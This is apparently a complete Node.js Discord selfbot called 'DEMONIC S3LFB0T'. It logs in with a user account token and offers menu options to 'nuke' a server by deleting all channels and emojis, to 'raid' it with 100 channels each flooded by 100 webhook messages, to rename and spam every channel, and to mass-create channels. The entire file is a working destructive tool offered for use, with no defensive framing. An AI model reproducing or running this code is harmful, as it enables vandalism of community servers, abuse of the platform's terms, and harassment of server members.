const { Client } = require('discord.js-selfbot-v13');
const readline = require('readline');

// Banner ASCII
console.log(`
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                        @@@@@                                           @@@@@                       
                    @@@@@@@@                                              @@@@@@@                   
                @@@@@@@@@@                    @       @                   @@@@@@@@@@@               
             @@@@@@@@@@@@@                    @@     @@                    @@@@@@@@@@@@@            
           @@@@@@@@@@@@@@@@                  @@@@   @@@@                  @@@@@@@@@@@@@@@@          
          @@@@@@@@@@@@@@@@@@@                @@@@@@@@@@@                @@@@@@@@@@@@@@@@@@@         
        @@@@@@@@@@@@@@@@@@@@@@@@@@          @@@@@@@@@@@@            @@@@@@@@@@@@@@@@@@@@@@@@@       
      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    
   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   
   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
   @@@            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@             @@   
                      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                          @            @@@@@@@@@@@@@@@@@@@@@              @@                        
                                          @@@@@@@@@@@@@@@@                                          
                                            @@@@@@@@@@@@                                            
                                              @@@@@@@@                                              
                                                @@@@@                                               
                                                 @@                                                 
                                                                                                    
                                            DEMONIC S3LFB0T
`);

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

let token;

function askToken() {
    rl.question('Put your token > ', async (input) => {
        token = input.trim();
        const client = new Client();

        try {
            await client.login(token);
            console.log('[+] Logged in successfully!');
            showMenu(client);
        } catch (err) {
            console.error('[x] ERROR: Invalid token or login failed');
            process.exit(1);
        }
    });
}

function showMenu(client) {
    console.log(`
     ____________________________________________________
    |  (1) Nuke             (2) Raid                    (3) Bypass  |
    |                          (4) Spam                                       |
    |                   (5)  createchannels                              |
    -------------------------------------------------------
    `);
    rl.question('> ', (option) => {
        switch (option.trim()) {
            case '1':
                handleNuke(client);
                break;
            case '2':
                handleRaid(client);
                break;
            case '3':
                handleBypass(client);
                break;
            case '4':
                handleSpam(client);
                break;
            case '5':
                handleCreateChannels(client);
                break;
            default:
                console.log('[x] Invalid option. Returning to menu...');
                showMenu(client);
        }
    });
}

function handleNuke(client) {
    rl.question('Put Server ID > ', async (serverId) => {
        try {
            const guild = await client.guilds.fetch(serverId.trim());
            await Promise.all(guild.channels.cache.map((channel) => channel.delete()));
            await Promise.all(guild.emojis.cache.map((emoji) => emoji.delete()));
            await guild.channels.create('get-nuked', { type: 'GUILD_TEXT' });
            console.log('[+] Server nuked successfully!');
        } catch {
            console.log('[x] ERROR: No tienes permisos en este servidor');
        }
        showMenu(client);
    });
}

function handleRaid(client) {
    rl.question('Put Server ID > ', async (serverId) => {
        rl.question('Put Message to Spam > ', (message) => {
            rl.question('Put Channel Names > ', async (channelName) => {
                try {
                    const guild = await client.guilds.fetch(serverId.trim());
                    for (let i = 0; i < 100; i++) {
                        const channel = await guild.channels.create(channelName, { type: 'GUILD_TEXT' });
                        const webhook = await channel.createWebhook('Destroyed by DemonicSelfbot');
                        for (let j = 0; j < 100; j++) {
                            await webhook.send(message);
                        }
                    }
                    console.log('[+] Raid completed!');
                } catch {
                    console.log('[x] ERROR: No tienes permisos en este servidor');
                }
                showMenu(client);
            });
        });
    });
}

function handleBypass(client) {
    rl.question('Put Server ID > ', async (serverId) => {
        rl.question('Put Name of the Channels > ', (channelName) => {
            rl.question('Put Message to Spam > ', async (message) => {
                try {
                    const guild = await client.guilds.fetch(serverId.trim());
                    await Promise.all(guild.channels.cache.map((ch) => ch.setName(channelName)));
                    for (const channel of guild.channels.cache.values()) {
                        const webhook = await channel.createWebhook('Destroyed by DemonicSelfbot');
                        await webhook.send(message);
                    }
                    console.log('[+] Bypass completed!');
                } catch {
                    console.log('[x] ERROR: No tienes permisos en este servidor');
                }
                showMenu(client);
            });
        });
    });
}

function handleSpam(client) {
    rl.question('Put Server ID > ', async (serverId) => {
        rl.question('Put Message to Spam > ', async (message) => {
            try {
                const guild = await client.guilds.fetch(serverId.trim());
                for (const channel of guild.channels.cache.values()) {
                    const webhook = await channel.createWebhook('Destroyed By DemonicSelfbot');
                    for (let i = 0; i < 100; i++) {
                        await webhook.send(message);
                    }
                }
                console.log('[+] Spam completed!');
            } catch {
                console.log('[x] ERROR: No tienes permisos en este servidor');
            }
            showMenu(client);
        });
    });
}

function handleCreateChannels(client) {
    rl.question('Put Server ID > ', async (serverId) => {
        rl.question('Put Name of the Channels > ', async (channelName) => {
            try {
                const guild = await client.guilds.fetch(serverId.trim());
                for (let i = 0; i < 100; i++) {
                    await guild.channels.create(channelName, { type: 'GUILD_TEXT' });
                }
                console.log('[+] Channels created!');
            } catch {
                console.log('[x] ERROR: No tienes permisos en este servidor');
            }
            showMenu(client);
        });
    });
}

askToken();
